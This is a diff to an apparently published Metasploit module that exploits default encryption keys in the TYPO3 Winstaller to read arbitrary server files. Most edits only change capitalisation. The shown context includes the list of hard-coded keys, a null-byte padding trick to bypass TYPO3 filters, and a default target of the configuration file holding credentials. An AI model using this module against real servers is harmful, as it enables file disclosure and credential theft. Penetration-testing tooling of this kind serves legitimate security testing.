@@ -18,15 +18,15 @@ class Metasploit3 < Msf::Auxiliary
 
 	def initialize
 		super(
-			'Name'			=> 'Typo3 Winstaller default Encryption Keys',
+			'Name'			=> 'TYPO3 Winstaller default Encryption Keys',
 			'Version'		=> '$Revision$',
 			'Description'	=> %q{
-				This module exploits known default encryption keys found in the Typo3 Winstaller.
+				This module exploits known default encryption keys found in the TYPO3 Winstaller.
 				This flaw allows for file disclosure in the jumpUrl mechanism. This issue can be
 				used to read any file that the web server user account has access to view.
 
 				The method used to create the juhash (short MD5 hash) was altered in later versions
-				of Typo3. Use the show actions command to display and select the version of Typo3 in
+				of Typo3. Use the show actions command to display and select the version of TYPO3 in
 				use (defaults to the older method of juhash creation).
 			},
 
@@ -40,15 +40,15 @@ class Metasploit3 < Msf::Auxiliary
 			'Actions'		=>
 								[
 									[ 'Short_MD5', {
-										'Description' => 'Typo3 ver 4.1.13 (or earlier), 4.2.12 (or earlier), 4.3.3 (or earlier), or 4.4.0',
+										'Description' => 'TYPO3 ver 4.1.13 (or earlier), 4.2.12 (or earlier), 4.3.3 (or earlier), or 4.4.0',
 									} ],
 
 									[ 'MIME', {
-										'Description' => 'Typo3 ver 4.1.14 (or later), 4.2.13 - 4.2.14, 4.3.4 - 4.3.6, or 4.4.1 - 4.4.3',
+										'Description' => 'TYPO3 ver 4.1.14 (or later), 4.2.13 - 4.2.14, 4.3.4 - 4.3.6, or 4.4.1 - 4.4.3',
 									} ],
 
 									[ 'HMAC_SHA1', {
-										'Description' => 'Typo3 4.2.15 (or later), Typo3 ver 4.3.7 (or later), Typo3 ver 4.4.4 (or later), Typo3 ver 4.5.0 (or later)',
+										'Description' => 'TYPO3 4.2.15 (or later), 4.3.7 (or later), 4.4.4 (or later), 4.5.0 (or later)',
 									} ],
                                 ],
 			'DefaultAction'	=> 'Short_MD5'
@@ -57,7 +57,7 @@ class Metasploit3 < Msf::Auxiliary
 		register_options(
 			[
 				Opt::RPORT(8503),
-				OptString.new('URI', [true, "Typo3 Path", "/"]),
+				OptString.new('URI', [true, "TYPO3 Path", "/"]),
 				OptString.new('RFILE', [true, "The remote file to download", 'typo3conf/localconf.php']),
 				OptString.new('ENC_KEY', [false, "Encryption key if known", '']),
 			], self.class)
@@ -66,7 +66,7 @@ class Metasploit3 < Msf::Auxiliary
 
 	def run
 
-	# Add padding to bypass Typo3 security filters
+	# Add padding to bypass TYPO3 security filters
 	#
 	# Null byte fixed in PHP 5.3.4
 	#
@@ -78,7 +78,7 @@ class Metasploit3 < Msf::Auxiliary
 		jumpurl = "#{datastore['RFILE']}%00/."
 		jumpurl_len = (jumpurl.length) -2 #Account for difference in length with null byte
 		jumpurl_enc = jumpurl.sub("%00", "\00") #Replace %00 with \00 to correct null byte format
-		print_status("Adding padding to end of #{datastore['RFILE']} to avoid Typo3 security filters")
+		print_status("Adding padding to end of #{datastore['RFILE']} to avoid TYPO3 security filters")
 	when /^..(\/|\\)/i
 		print_error("Directory traversal detected... you might want to start that with a /.. or \\..")
 	else
@@ -105,23 +105,23 @@ class Metasploit3 < Msf::Auxiliary
 	else
 		print_status("Rotating through known encryption keys")
 		encryption_keys = [
-			#Typo3 4.3.x - 4.4.x
+			#TYPO3 4.3.x - 4.4.x
 			'd696ab49a803d7816021cb1768a6917d',
 			'47d1e990583c9c67424d369f3414728e6793d9dc2ae3429d488a7374bc85d2a0b19b62de67d46a6079a75f10934288d3',
 			'7b13b2203029ed80337f27127a9f1d28c2597f4c08c9a07b782b674731ecf5328c4d900851957899acdc6d4f911bf8b7',
-			#Typo3 4.4.x
+			#TYPO3 4.4.x
 			'fbbdebd9091d914b3cd523485afe7b03e6006ade4125e4cf4c46195b3cecbb9ae0fe0f7b5a9e72ea2ac5f17b66f5abc7',
-			#Typo3 4.5.0
+			#TYPO3 4.5.0
 			'def76f1d8139304b7edea83b5f40201088ba70b20feabd8b2a647c4e71774b7b0e4086e4039abaf5d4f6a521f922e8a2',
 			'bac0112e14971f00431639342415ff22c3c3bf270f94175b8741c0fa95df244afb61e483c2facf63cffc320ed61f2731',
-			#Typo3 4.5.0
+			#TYPO3 4.5.0
 			'def76f1d8139304b7edea83b5f40201088ba70b20feabd8b2a647c4e71774b7b0e4086e4039abaf5d4f6a521f922e8a2',
 			'bac0112e14971f00431639342415ff22c3c3bf270f94175b8741c0fa95df244afb61e483c2facf63cffc320ed61f2731',
-			#Typo3 4.5.2
+			#TYPO3 4.5.2
 			'14b1225e2c277d55f54d18665791f114f4244f381113094e2a19dfb680335d842e10460995eb653d105a562a5415d9c7',
-			#Typo3 4.5.3
+			#TYPO3 4.5.3
 			'5d4eede80d5cec8df159fd869ec6d4041cd2fc0136896458735f8081d4df5c22bbb0665ddac56056023e01fbd4ab5283',
-			#Typo3 4.5.4
+			#TYPO3 4.5.4
 			'b2aae63def4c512ce8f4386e57b8a48b40312de30775535cbff60a6eab356809a0b596edaad49c725d9963d93aa2ffae'
 			]
 	end
@@ -168,8 +168,8 @@ class Metasploit3 < Msf::Auxiliary
 			},25)
 
 		rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
-		rescue ::Timeout::Error, ::Errno::EPIPE
-
+		rescue ::Timeout::Error, ::Errno::EPIPE => e
+			print_error(e.message)
 		end
 
 		case file.headers['Content-Type']
